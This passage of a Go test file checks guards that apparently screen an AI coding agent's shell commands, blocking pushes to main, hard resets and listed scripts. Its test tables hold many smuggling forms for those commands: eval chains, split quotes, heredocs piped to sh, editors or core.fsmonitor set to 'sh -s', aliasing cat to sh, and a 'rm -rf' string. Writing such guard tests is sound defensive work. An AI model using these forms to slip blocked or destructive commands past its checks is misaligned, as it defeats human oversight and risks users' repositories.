		if (d != nil) != tt.deny {
			t.Errorf("Check(%q) denial = %v, want deny %v", tt.command, d, tt.deny)
		}
	}
}

// TestGitPushMainPlainOriginRealGit checks the git-backed resolvers against
// real repos: a bare push follows remote.pushDefault and branch pushRemote,
// and the exemption names the repo origin pushes to, so a pushurl in the
// repo's config or a pushInsteadOf rewrite moves the push out of it.
func TestGitPushMainPlainOriginRealGit(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))
	exempt := []string{"github.com/mad01/dotfiles"}
	tests := []struct {
		name   string
		config [][]string
		deny   bool
	}{
		{"origin by default", nil, false},
		{"branch remote origin", [][]string{{"branch.main.remote", "origin"}}, false},
		{"pushDefault elsewhere", [][]string{{"remote.pushDefault", "up"}}, true},
		{"branch pushRemote elsewhere", [][]string{{"branch.main.pushRemote", "up"}}, true},
		{
			"origin pushurl elsewhere",
			[][]string{{"remote.origin.pushurl", "git@github.com:mad01/other.git"}},
			true,
		},
		{"pushInsteadOf elsewhere", [][]string{
			{"url.git@github.com:mad01/other.pushInsteadOf", "git@github.com:mad01/dotfiles"},
		}, true},
	}
	for i, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			repo := initRepo(
				t,
				filepath.Join(home, "r", string(rune('a'+i))),
				"git@github.com:mad01/dotfiles.git",
			)
			gitIn(t, repo, "remote", "add", "up", "git@github.com:mad01/other.git")
			for _, kv := range tt.config {
				gitIn(t, repo, "config", kv[0], kv[1])
			}
			g := NewGitPushMain(config.Config{DirectMainRepos: exempt})
			d := g.Check(Input{Event: EventBash, Command: "git push", Cwd: repo})
			if (d != nil) != tt.deny {
				t.Errorf("bare push denial = %v, want deny %v", d, tt.deny)
			}
		})
	}
}

// gitIn runs one git command in dir and fails the test on an error.
func gitIn(t *testing.T, dir string, args ...string) {
	t.Helper()
	if out, err := gitCmd(dir, args...).CombinedOutput(); err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
}

// laterSyntaxErrors (review finding 3) are pushes on whole lines before a
// line the reader cannot follow. bash runs every whole line before a syntax
// error, so the push runs and must be judged like a plain one.
var laterSyntaxErrors = []string{
	"(git push origin main)\n(",
	"echo $(git push origin main)\necho 'x",
	"sh -c 'git push origin main'\necho \"x",
	"eval 'git push origin main'\n`",
}

// TestGitGuardsReadLinesBeforeASyntaxError pins the walk of a text the
// reader cannot follow: its whole lines up to the one that fails get the full
// walk, and the rest is read fail-closed, so a git word and a guarded
// subcommand there deny wherever they stand.
func TestGitGuardsReadLinesBeforeASyntaxError(t *testing.T) {
	tests := []struct {
		command string
		deny    bool
	}{
		{laterSyntaxErrors[0], true},
		{laterSyntaxErrors[1], true},
		{laterSyntaxErrors[2], true},
		{laterSyntaxErrors[3], true},
		{"echo 'x\n(git push origin main)", true},
		{"echo \"x\n$(git push origin main)", true},
		{"echo 'x\necho \"g\"it pu''sh origin main", true},
		{"git push origin feature\n(", false},
		{"(git push origin feature)\necho 'x", false},
		{"git status\necho 'x", false},
	}
	for _, tt := range tests {
		d := newGitPushGuard(
			"main",
		).Check(Input{Event: EventBash, Command: tt.command, Cwd: "/tmp"})
		if (d != nil) != tt.deny {
			t.Errorf("git-push-main Check(%q) denial = %v, want deny %v", tt.command, d, tt.deny)
		}
	}
	for _, tt := range tests {
		if !tt.deny {
			continue
		}
		reset := strings.NewReplacer("git push origin main", "git reset --hard",
			"pu''sh origin main", "res''et --hard").Replace(tt.command)
		if d := dirtyDiscardGuard().Check(Input{Event: EventBash, Command: reset, Cwd: "/tmp"}); d == nil {
			t.Errorf("git-discard allowed %q", reset)
		}
	}
}

// TestDeepNestingIsBounded (review finding 8): substitutions nested far past
// maxShellNesting read as unread text at once, instead of every walk reading
// the text again level by level, and a push inside them is denied.
func TestDeepNestingIsBounded(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	t.Setenv("CDPATH", "")
	script := NewScriptDenyList(scriptDenyConfig(maskClaudeDeny, maskExtra))
	for _, deep := range []string{
		strings.Repeat(`echo "$(`, 3200) + "x" + strings.Repeat(`)"`, 3200),
		strings.Repeat("(", 9000) + "x" + strings.Repeat(")", 9000),
		strings.Repeat("eval ", 20000) + "git push origin main",
	} {
		start := time.Now()
		for _, g := range []Guard{newGitPushGuard("main"), dirtyDiscardGuard(), script} {
			g.Check(Input{Event: EventBash, Command: deep, Cwd: "/tmp"})
		}
		if elapsed := time.Since(start); elapsed > 2*time.Second {
			t.Errorf("guards took %v on a %d-byte command starting %q, want under 2s",
				elapsed, len(deep), deep[:12])
		}
	}
	evals := strings.Repeat("eval ", 20000) + "git push origin main"
	if newGitPushGuard(
		"feature",
	).Check(Input{Event: EventBash, Command: evals, Cwd: "/tmp"}) ==
		nil {
		t.Error("a push behind 20000 evals was allowed")
	}
	tests := []struct {
		levels int
		branch string
		deny   bool
	}{
		{maxShellNesting + 10, "main", true},
		{maxShellNesting + 10, "feature", false},
		{8, "main", true},
		{8, "feature", false},
	}
	for _, tt := range tests {
		cmd := strings.Repeat("echo $(", tt.levels) + "git push origin " + tt.branch +
			strings.Repeat(")", tt.levels)
		if d := newGitPushGuard("feature").Check(Input{Event: EventBash, Command: cmd, Cwd: "/tmp"}); (d != nil) != tt.deny {
			t.Errorf(
				"%d levels, push to %s: denial = %v, want deny %v",
				tt.levels,
				tt.branch,
				d,
				tt.deny,
			)
		}
	}
}

// TestEvalChainPastTheLimitReadsOnce: a chain of evals that nests past
// maxShellNesting reads the text after its first eval once, as unread, and
// a chain up to the limit is still walked eval by eval to a full read.
func TestEvalChainPastTheLimitReadsOnce(t *testing.T) {
	t.Setenv("CDPATH", "")
	tests := []struct {
		evals, steps int
		unread       bool
	}{
		{maxShellNesting, maxShellNesting + 1, false},
		{maxShellNesting + 1, 2, true},
		{20000, 2, true},
	}
	for _, tt := range tests {
		cmd := strings.Repeat("eval ", tt.evals) + "git push origin main"
		var steps []walkStep
		walkCommands(cmd, "/tmp", func(s walkStep) { steps = append(steps, s) })
		last := steps[len(steps)-1]
		if len(steps) != tt.steps || last.unread != tt.unread ||
			!strings.HasSuffix(strings.Join(last.tokens, " "), "git push origin main") {
			t.Errorf(
				"%d evals: %d steps, last unread %v, want %d steps, unread %v, ending in the push",
				tt.evals,
				len(steps),
				last.unread,
				tt.steps,
				tt.unread,
			)
		}
	}
}

// TestMaskDataNeedsAWholeRead: a command the reader cannot follow to the end
// is never masked, even where its first lines read cleanly.
func TestMaskDataNeedsAWholeRead(t *testing.T) {
	for _, cmd := range []string{
		"echo \"rm -rf /x\"\necho 'x",
		"git commit -m \"rm -rf /x\"\n(",
	} {
		if got := maskData(cmd); got != cmd {
			t.Errorf("maskData(%q) = %q, want it unchanged", cmd, got)
		}
	}
}

// TestGitGuardsDelimiterPrefix: bash ends a heredoc inside $( ) at a line
// that starts with the delimiter (`EOF)`) and runs the rest of that line, so
// the git guards must see a push or a reset there.
func TestGitGuardsDelimiterPrefix(t *testing.T) {
	push := fmt.Sprintf(delimPrefixed, "git push origin main")
	if d := newGitPushGuard("feature").Check(Input{Event: EventBash, Command: push, Cwd: "/tmp"}); d == nil {
		t.Errorf("git-push-main allowed %q", push)
	}
	reset := fmt.Sprintf(delimPrefixed, "git reset --hard")
	if d := dirtyDiscardGuard().Check(Input{Event: EventBash, Command: reset, Cwd: "/tmp"}); d == nil {
		t.Errorf("git-discard allowed %q", reset)
	}
	if _, ok := readShell(push); ok {
		t.Errorf("readShell(%q) read it, want not ok", push)
	}
	// At the top level bash and zsh agree the body ends at the exact line.
	if _, ok := readShell("cat <<'EOF'\nEOF)\nEOF"); !ok {
		t.Error("readShell of a top-level heredoc with an `EOF)` line failed")
	}
}

// dirtyDiscardGuard is git-discard over a tree that is always dirty, so
// seeing a discarding command denies.
func dirtyDiscardGuard() *GitDiscard {
	g := NewGitDiscard(config.Config{})
	g.resolveRepo = func(string) string { return "github.com/mad01/thismoon" }
	g.emit = func(_, _, _, _ string, _ map[string]string) {}
	g.status = func(string, ...string) (string, bool) { return " M file.go", true }
	return g
}

// TestReadShellSubstitutionHeredoc pins the close of a $( ) that holds a
// heredoc: an apostrophe or a ) in the body is text, not syntax.
func TestReadShellSubstitutionHeredoc(t *testing.T) {
	cmd := "git commit -m \"$(cat <<'EOF'\ndon't (stop)\n)\nEOF\n)\" && git push origin main"
	cmds, ok := readShell(cmd)
	if !ok || len(cmds) != 2 {
		t.Fatalf("readShell = %d commands, ok %v; want 2, true", len(cmds), ok)
	}
	if got := cmds[1].tokens(); strings.Join(got, " ") != "git push origin main" {
		t.Errorf("second command = %q", got)
	}
	if cmds[1].before != jointAnd {
		t.Errorf("second command joint = %v, want &&", cmds[1].before)
	}
}

// heredocBodies (second review, F1 and F1b) pin how a heredoc body is read.
// A body cat, tee, gh or git commit only reads is prose: a quoted one expands
// nothing, so a backtick or $( ) there is text, while the shell runs every
// $( ) and backtick of an unquoted one, an apostrophe or a # before it
// included. A body a shell may run is read as code, as before.
var heredocBodies = []struct {
	name, command string
	deny          bool
}{
	{
		"gh body, quoted",
		"gh pr create --title \"x\" --body \"$(cat <<'EOF2'\nso `git push origin main` is text.\nEOF2\n)\"",
		false,
	},
	{"plain quoted cat", "cat <<'EOF2'\nso `git push origin main` is text.\nEOF2", false},
	{
		"assignment, quoted",
		"X=\"$(cat <<'EOF2'\nso `git push origin main` is text.\nEOF2\n)\"",
		false,
	},
	{
		"bare assignment, quoted",
		"X=$(cat <<'EOF2'\nso `git push origin main` is text.\nEOF2\n)",
		false,
	},
	{
		"commit message, quoted",
		"git commit -m \"$(cat <<'EOF2'\nso `git push origin main` is text.\nEOF2\n)\"",
		false,
	},
	{
		"commit message with apostrophes",
		"git commit -m \"$(cat <<'EOF2'\nSplits on quotes now, so `git push origin main` in a body is text.\n" +
			"Don't refuse: it's a commit message.\nEOF2\n)\"",
		false,
	},
	{"quoted cat, substitution line", "cat <<'EOF2'\n$(git push origin main)\nEOF2", false},
	{
		"quoted cat, apostrophe then substitution",
		"cat <<'EOF2'\nDon't $(git push origin main)\nEOF2",
		false,
	},
	{
		"quoted cat into a file",
		"cat > /tmp/n.md <<'EOF2'\n`git push origin main` pushes\nEOF2",
		false,
	},
	{"commit -F -, quoted", "git commit -F - <<'EOF2'\nnever `git push origin main`\nEOF2", false},
	{"escaped substitution, unquoted", "cat <<EOF2\nDon't \\$(git push origin main)\nEOF2", false},
	// MAD-579: a body piped from cat into a gh call that reads it as its body,
	// and the git subcommands that read a message with -F - or --file=-.
	{
		"cat piped into gh pr create",
		"cat <<'EOF2' | gh pr create --title x --body-file -\nNever `git push origin main`.\nEOF2",
		false,
	},
	{
		"cat piped into gh pr comment",
		"cat <<'EOF2' | gh pr comment 1 --body-file -\nNever `git push origin main`.\nEOF2",
		false,
	},
	{
		"cat piped into gh pr edit, -F -",
		"cat <<'EOF2' | gh pr edit 1 -F -\nNever `git push origin main`.\nEOF2",
		false,
	},
	{
		"cat piped into gh issue create, = form",
		"cat <<'EOF2' | gh issue create --title x --body-file=-\nNever `git push origin main`.\nEOF2",
		false,
	},
	{
		"cat piped into gh issue comment",
		"cat <<'EOF2' | gh issue comment 1 --body-file -\nNever `git push origin main`.\nEOF2",
		false,
	},
	{"tag -F -", "git tag -a v1 -F - <<'EOF2'\nNever `git push origin main`.\nEOF2", false},
	{"tag --file=-", "git tag -a v1 --file=- <<'EOF2'\nNever `git push origin main`.\nEOF2", false},
	{"notes add -F -", "git notes add -F - <<'EOF2'\nNever `git push origin main`.\nEOF2", false},
	{
		"commit --amend -F -",
		"git commit --amend -F - <<'EOF2'\nNever `git push origin main`.\nEOF2",
		false,
	},
	{"merge -F -", "git merge -F - fix/x <<'EOF2'\nNever `git push origin main`.\nEOF2", false},
	// MAD-663: a body git tag or git notes add takes as its message is text,
	// so a line that names a push or a discard in plain words counts for
	// nothing.
	{"tag -F -, a push line", "git tag -a v1 -F - <<'EOF2'\ngit push origin main\nEOF2", false},
	{"tag, unquoted literal body", "git tag -a v1 -F - <<EOF2\ngit push origin main\nEOF2", false},
	{"tag -F /dev/stdin", "git tag -a v1 -F /dev/stdin <<'EOF2'\ngit push origin main\nEOF2", false},
	{"tag -F/dev/stdin", "git tag -a v1 -F/dev/stdin <<'EOF2'\ngit push origin main\nEOF2", false},
	{"notes add -F -, a push line", "git notes add -F - <<'EOF2'\ngit push origin main\nEOF2", false},
	// git commit and git merge refresh the index before they read -F, and
	// core.fsmonitor then runs a configured program with git's standard
	// input, so their heredoc keeps the walk.
	{"commit -F -, plain words", "git commit -q -F - <<'EOF2'\nfix: so git push origin main is text\nEOF2", true},
	{"commit -F -, a push line", "git commit -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	{"commit -F /dev/stdin", "git commit -F /dev/stdin <<'EOF2'\ngit push origin main\nEOF2", true},
	{"merge --file=-, a push line", "git merge --file=- fix/x <<'EOF2'\ngit push origin main\nEOF2", true},
	{"merge -F /dev/stdin", "git merge --no-ff -F /dev/stdin side <<'EOF2'\ngit push origin main\nEOF2", true},
	{
		"commit after core.fsmonitor is set",
		"git config core.fsmonitor 'sh -s' && git commit -F - <<'EOF2'\ngit push origin main\nEOF2",
		true,
	},
	// A word the shell expands may turn into an option such as -e, so every
	// word must be literal; a heredoc on another descriptor is not the file.
	{
		"commit {-e,-q} -m cat",
		"git commit {-e,-q} -m \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\"",
		true,
	},
	{"commit $E -m cat", "git commit $E -m \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\"", true},
	{
		"commit -m unquoted cat",
		"git commit -m $(cat <<'EOF2'\nx -e git push origin main\nEOF2\n)",
		true,
	},
	{"tag {-e,-a} -F -", "git tag {-e,-a} -F - v1 <<'EOF2'\ngit push origin main\nEOF2", true},
	{"tag printf -e -F -", "git tag \"$(printf %s -e)\" -a -F - v1 <<'EOF2'\ngit push origin main\nEOF2", true},
	{"notes add {-e,-f} -F -", "git notes add {-e,-f} -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	{"tag with a glob operand", "git tag -a -F - v* <<'EOF2'\ngit push origin main\nEOF2", true},
	{"tag -C $D", "git -C $D tag -a -F - v1 <<'EOF2'\ngit push origin main\nEOF2", true},
	{"tag -F - on fd 3", "git tag -a -F - v1 3<<'EOF2'\ngit push origin main\nEOF2", true},
	// A quote or $ keeps a word's token as written, so '-em$' must not read
	// as an operand: git gets -e -m '$'.
	{"notes add '-em$' -F -", "git notes add '-em$' -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	{
		"commit '-em$' -m cat",
		"git commit --allow-empty '-em$' -m \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\"",
		true,
	},
	{
		"commit -m 'fix(x): y' -m cat",
		"git commit -m 'fix(x): y' -m \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\"",
		false,
	},
	// A -F that is the value of -m names no message file.
	{"tag -m -F -", "git tag -a -m -F - v1 <<'EOF2'\ngit push origin main\nEOF2", true},
	{
		"commit -m cat, plain words",
		"git commit -m \"$(cat <<'EOF2'\nfix: so git push origin main is text\nEOF2\n)\"",
		false,
	},
	{
		"commit -m cat, a push line",
		"git commit -q -m \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\" && git status",
		false,
	},
	{"commit --message=cat", "git commit --message=\"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\"", false},
	{"commit -am cat", "git commit -am \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\"", false},
	{"commit -C dir -m cat", "git -C /tmp commit -m \"$(cat <<EOF2\ngit push origin main\nEOF2\n)\"", false},

	{"unquoted, apostrophe then backticks", "cat <<EOF2\nDon't `git push origin main`\nEOF2", true},
	{
		"unquoted, apostrophe then substitution",
		"cat <<EOF2\nDon't $(git push origin main)\nEOF2",
		true,
	},
	{
		"unquoted, apostrophes around",
		"cat <<EOF2\nit's $(git push origin main) and it's\nEOF2",
		true,
	},
	{"unquoted, comment then backticks", "cat <<EOF2\na # it's `git push origin main`\nEOF2", true},
	{"unquoted, # before substitution", "cat <<EOF2\n# $(git push origin main)\nEOF2", true},
	{"unquoted, quoted substitution", "cat <<EOF2\nx \"$(git push origin main)\" y\nEOF2", true},
	{
		"unquoted gh body",
		"gh pr create --title x --body \"$(cat <<EOF2\nDon't `git push origin main`\nEOF2\n)\"",
		true,
	},
	// MAD-672: the shell drops an unquoted body's backslash-newlines before it
	// looks for a substitution, and takes one level of escapes off a backtick
	// body, so `$\` then `(cmd)` and `echo \`cmd\`` inside backticks run cmd.
	// bash 3.2, bash 5.3 and zsh 5.9 agree.
	{"unquoted, $\\ joins (", "cat <<EOF2\nx $\\\n(git push origin main)\nEOF2", true},
	{"unquoted, nested backticks", "cat <<EOF2\nx `echo \\`git push origin main\\``\nEOF2", true},
	{
		"commit -F -, $\\ joins (",
		"git commit -F - <<EOF2\nx $\\\n(git push origin main)\nEOF2",
		true,
	},
	{
		"commit -F -, nested backticks",
		"git commit -F - <<EOF2\nx `echo \\`git push origin main\\``\nEOF2",
		true,
	},
	{
		"gh --body-file -, $\\ joins (",
		"gh pr create --title x --body-file - <<EOF2\nx $\\\n(git push origin main)\nEOF2",
		true,
	},
	{
		"gh --body-file -, nested backticks",
		"gh pr create --title x --body-file - <<EOF2\nx `echo \\`git push origin main\\``\nEOF2",
		true,
	},
	{
		"cat piped into gh, $\\ joins (",
		"cat <<EOF2 | gh pr create --title x --body-file -\nx $\\\n(git push origin main)\nEOF2",
		true,
	},
	{
		"cat piped into gh, nested backticks",
		"cat <<EOF2 | gh pr create --title x --body-file -\nx `echo \\`git push origin main\\``\nEOF2",
		true,
	},
	{"unquoted, two joins", "cat <<EOF2\nx $\\\n\\\n(git push origin main)\nEOF2", true},
	{"unquoted <<-, $\\ joins (", "cat <<-EOF2\n\tx $\\\n(git push origin main)\n\tEOF2", true},
	{
		"unquoted, backticks two levels deep",
		"cat <<EOF2\nx `echo \\`echo \\\\\\`git push origin main\\\\\\`\\``\nEOF2",
		true,
	},
	{"unquoted, \\$( in backticks", "cat <<EOF2\nx `echo \\$(git push origin main)`\nEOF2", true},
	// In a body a backtick body keeps the backslash of \", unlike inside
	// double quotes, so the \" ends no quote and bash 3.2, bash 5.3 and zsh
	// 5.9 run the push. A notes message body is text but for its $( ) and
	// backticks, so only the backtick reading decides these rows.
	{
		"notes -F -, \\\" in backticks ends no quote",
		"git notes add -F - <<EOF2\n`echo \\\"; git push origin main; echo \\\"`\nEOF2",
		true,
	},
	{
		"commit -m cat, $\\ joins (",
		"git commit -m \"$(cat <<EOF2\nx $\\\n(git push origin main)\nEOF2\n)\"",
		true,
	},
	{"quoted, $\\ then (", "cat <<'EOF2'\nx $\\\n(git push origin main)\nEOF2", false},
	{"quoted, nested backticks", "cat <<'EOF2'\nx `echo \\`git push origin main\\``\nEOF2", false},
	{"double-quoted, $\\ then (", "cat <<\"EOF2\"\nx $\\\n(git push origin main)\nEOF2", false},
	{
		"backslash-quoted, nested backticks",
		"cat <<\\EOF2\nx `echo \\`git push origin main\\``\nEOF2",
		false,
	},
	{
		"commit -F -, quoted, nested backticks",
		"git commit -F - <<'EOF2'\nx `echo \\`git push origin main\\``\nEOF2",
		false,
	},
	{
		"gh --body-file -, quoted, $\\ then (",
		"gh pr create --title x --body-file - <<'EOF2'\nx $\\\n(git push origin main)\nEOF2",
		false,
	},
	{"unquoted, \\$ then a join", "cat <<EOF2\nx \\$\\\n(git push origin main)\nEOF2", false},
	{"unquoted, \\\\ joins nothing", "cat <<EOF2\nx $\\\\\n(git push origin main)\nEOF2", false},
	{"unquoted, escaped backticks", "cat <<EOF2\nx \\`git push origin main\\`\nEOF2", false},
	{
		"notes -F -, \\\" in backticks keeps a push quoted",
		"git notes add -F - <<EOF2\n`echo \\\"'\\\"; git push origin main; echo \\\"'\\\"`\nEOF2",
		false,
	},
	{
		"notes -F -, \\\" in a string in backticks",
		"git notes add -F - <<EOF2\n`echo \"\\\"; git push origin main; echo \\\"\"`\nEOF2",
		false,
	},
	{
		"unquoted, escaped backticks in $( )",
		"cat <<EOF2\nx $(echo \\`git push origin main\\`)\nEOF2",
		false,
	},
	{
		"unquoted, escaped backticks two levels deep",
		"cat <<EOF2\nx `echo \\\\\\`git push origin main\\\\\\``\nEOF2",
		false,
	},
	{"unquoted, backslash before plain text", "cat <<EOF2\nfix: a long\\\nline\nEOF2", false},
	{
		"commit -F -, backslash before plain text",
		"git commit -F - <<EOF2\nfix: a long\\\nline\nEOF2",
		false,
	},
	{
		"commit -F -, plain message",
		"git commit -F - <<EOF2\nfeat: add x\n\nIt's the body, with a (paren) and a \\ in it.\nEOF2",
		false,
	},
	{
		"gh --body-file -, plain body",
		"gh pr create --title x --body-file - <<EOF2\nSummary line.\n\nIt's the body.\nEOF2",
		false,
	},
	{
		"plain push line in a quoted body",
		"cat <<'EOF2'\nso git push origin main is text.\nEOF2",
		true,
	},
	{"quoted body into bash", "bash <<'EOF'\n(git push origin main)\nEOF", true},
	{"quoted body piped into sh", "cat <<'EOF' | sh\n$(git push origin main)\nEOF", true},
	{"quoted body into python", "python3 - <<'EOF'\n(git push origin main)\nEOF", true},
	{"quoted body over ssh", "ssh host <<'EOF'\n(git push origin main)\nEOF", true},
	{"cat into bash -c", "bash -c \"$(cat <<'EOF'\n(git push origin main)\nEOF\n)\"", true},
	{"cat into eval", "eval \"$(cat <<'EOF'\n`git push origin main`\nEOF\n)\"", true},
	{"tee into a process substitution", "tee >(sh) <<'EOF'\n(git push origin main)\nEOF", true},
	{
		"cat piped into gh, then into sh",
		"cat <<'EOF2' | gh pr create --title x --body-file - | sh\nNever `git push origin main`.\nEOF2",
		true,
	},
	{
		"cat piped into gh that reads no body",
		"cat <<'EOF2' | gh pr create --title x --body y\nNever `git push origin main`.\nEOF2",
		true,
	},
	{
		"tag -F - piped into sh",
		"git tag -a v1 -F - <<'EOF2' | sh\n`git push origin main`\nEOF2",
		true,
	},
	{"tag without -F -", "git tag -a v1 <<'EOF2'\nNever `git push origin main`.\nEOF2", true},
	// MAD-663: what runs around a message is still code.
	{"commit -F -, unquoted substitution", "git commit -F - <<EOF2\nx $(git push origin main)\nEOF2", true},
	{"commit -F -, unquoted backticks", "git commit -F - <<EOF2\nx `git push origin main`\nEOF2", true},
	{"commit -F - piped into sh", "git commit -F - <<'EOF2' | sh\ngit push origin main\nEOF2", true},
	{"commit -F -, a push after the body", "git commit -F - <<'EOF2'\nx\nEOF2\ngit push origin main", true},
	{"tag -F of a file", "git tag -a v1 -F notes.txt <<'EOF2'\ngit push origin main\nEOF2", true},
	{
		"commit -m cat, unquoted substitution",
		"git commit -m \"$(cat <<EOF2\nx $(git push origin main)\nEOF2\n)\"",
		true,
	},
	{
		"commit -m cat piped into sh",
		"git commit -m \"$(cat <<'EOF2' | sh\ngit push origin main\nEOF2\n)\"",
		true,
	},
	{
		"commit -m with code beside cat",
		"git commit -m \"$(git push origin main; cat <<'EOF2'\nx\nEOF2\n)\"",
		true,
	},
	{
		"commit -m cat, commit piped into sh",
		"git commit -m \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\" | sh",
		true,
	},
	{
		"commit -m cat, then a substitution",
		"git commit -m \"$(cat <<'EOF2'\nx\nEOF2\n)$(git push origin main)\"",
		true,
	},
	{
		"echo of a cat, not a message",
		"echo \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\"",
		true,
	},
	{
		"commit -m cat inside eval",
		"eval \"$(git commit -m \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\")\"",
		true,
	},
	// Without -F - a commit hands its standard input to the editor.
	{
		"commit body to a shell editor",
		"GIT_EDITOR='sh -s' git commit --allow-empty <<'EOF2'\ngit push origin main\nEOF2",
		true,
	},
	{"commit body to a -c editor", "git -c core.editor='sh -s' commit <<'EOF2'\ngit push origin main\nEOF2", true},
	// A git or cat the same command may have redefined, or a git found
	// elsewhere, is not the git that stores a message.
	{"git function", "git() { sh; }; git tag -a v1 -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	{
		"cat function",
		"cat() { sh; }; git commit -m \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\"",
		true,
	},
	{
		"cat alias",
		"alias cat=sh\ngit commit -m \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\"",
		true,
	},
	{"PATH in front", "PATH=/x:$PATH git tag -a v1 -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	{"PATH set before", "export PATH=/x; git tag -a v1 -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	{"a git by path", "./git tag -a v1 -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	{"source before", "source x.sh; git tag -a v1 -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	// What git prints holds the subject line; written to a file a shell
	// then runs, the text after a ; in it is a command.
	{
		"tag output to a file",
		"git tag -a v1 -F - <<'EOF2' > /tmp/o.txt\nx; git push origin main\nEOF2\nsh /tmp/o.txt",
		true,
	},
	{
		"commit -m cat output to a file",
		"git commit -m \"$(cat <<'EOF2'\nx; git push origin main\nEOF2\n)\" &> /tmp/x.sh; . /tmp/x.sh",
		true,
	},
	{
		"subshell output to a file",
		"(git tag -a v1 -F - <<'EOF2'\nx; git push origin main\nEOF2\n) > /tmp/o.sh; sh /tmp/o.sh",
		true,
	},
	{
		"group output to a file",
		"{ git tag -a v1 -F - <<'EOF2'\nx; git push origin main\nEOF2\n} > /tmp/o.sh; sh /tmp/o.sh",
		true,
	},
	{"exec before", "exec > /tmp/o.sh; git tag -a v1 -F - <<'EOF2'\nx; git push origin main\nEOF2", true},
	// With -e git hands the message file to the editor, which may be a shell.
	{"commit -e -F -", "git -c core.editor=sh commit -e -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	{"commit -qe -F -", "git commit -qe -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	{"commit --edi -F -", "git commit --edi -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	{"tag -e -F -", "git tag -a v1 -e -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	// -s takes no value for commit and tag, so the e after it is -e.
	{"commit -se -F -", "git commit --allow-empty -se -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	{"commit -sae -F -", "git commit -sae -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	{"tag -se -F -", "git tag -f -se -F - t1 <<'EOF2'\ngit push origin main\nEOF2", true},
	{
		"commit -se -m cat",
		"git commit --allow-empty -se -m \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\"",
		true,
	},
	// -p and --interactive answer their hunk prompts from standard input, and
	// an e answer opens the editor. Any option belt does not know ends the pass.
	{"commit -p -F -", "git commit -p -F - <<'EOF2'\ne\ngit push origin main\nEOF2", true},
	{"commit -ap -F -", "git commit -ap -F - <<'EOF2'\ne\ngit push origin main\nEOF2", true},
	{"commit --patch -F -", "git commit --patch -F - <<'EOF2'\ne\ngit push origin main\nEOF2", true},
	{"commit --interactive -F -", "git commit --interactive -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	{"commit with an unknown option", "git commit --frobnicate -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	// A global option may bring in a pager or a config value: only -C passes.
	{"git -c before commit", "git -c pager.commit=sh commit -F - <<'EOF2'\nx; git push origin main\nEOF2", true},
	{"git -p before commit", "git -p commit -F - <<'EOF2'\nx; git push origin main\nEOF2", true},
	// An option may take -- as its value, so a later -e still starts the editor.
	{
		"commit -m -- -e -m cat",
		"git commit -m -- -e -m \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\"",
		true,
	},
	{"commit --trailer -- -e -F -", "git commit --trailer -- -e -F - <<'EOF2'\ngit push origin main\nEOF2", true},
	{"notes add -m -- -e -F -", "git notes add -m -- -e -F - HEAD <<'EOF2'\ngit push origin main\nEOF2", true},
	{
		"merge --into-name -- -e",
		"git merge --no-ff --into-name -- -e -F /dev/stdin side <<'EOF2'\ngit push origin main\nEOF2",
		true,
	},
	{
		"commit -e -m cat",
		"git commit -e -m \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\"",
		true,
	},
	// bash 3.2 ends a $( ) at the first ) its scan cannot match and knows no
	// heredoc, so a ) in the body ends it early, and a lone ' runs past it
	// to a later word that closes it.
	{
		"commit -m cat, a ) ends it in bash 3.2",
		"git commit --allow-empty -m \"$(cat <<'EOF2'\nx\n)\"; git push origin main; echo \"(\nEOF2\n)\"",
		true,
	},
	{
		"commit -m cat, a lone apostrophe a later word closes",
		"git commit -m \"$(cat <<'EOF2'\ndon't git push origin main\nEOF2\n)\" -m \"it's done)\"",
		true,
	},
}

// TestGitGuardsHeredocMessagePasses pins the MAD-663 message forms that pass:
// a -m cat body of which bash 3.2 runs no more than cat (bash32Closes), and
// --no-edit asks for no editor. Inside double quotes a # starts no comment
// there, and a ) that ends the substitution early leaves the rest of the
// body as text of the same word. A lone apostrophe bash 3.2 never closes is
// a syntax error there, which runs nothing (bash32Unclosed).
func TestGitGuardsHeredocMessagePasses(t *testing.T) {
	for _, command := range []string{
		"git commit -m \"$(cat <<'EOF2'\nfix(belt): so git push origin main is text\nEOF2\n)\"",
		"git commit -m \"$(cat <<'EOF2'\ndon't git push origin main\nEOF2\n)\"",
		"git commit -m \"$(cat <<'EOF2'\ndon't git push origin main\nEOF2\n)\" -m \"second (one)\"",
		"git commit -m \"$(cat <<'EOF2'\nit's 'git push origin main', it's text\nEOF2\n)\"",
		"git commit -m \"$(cat <<'EOF2'\nfixes #1: git push origin main\nEOF2\n)\"",
		"git commit -m \"$(cat <<'EOF2'\nfix: two cases\n\n1) git push origin main\n2) a wrapper\nEOF2\n)\"",
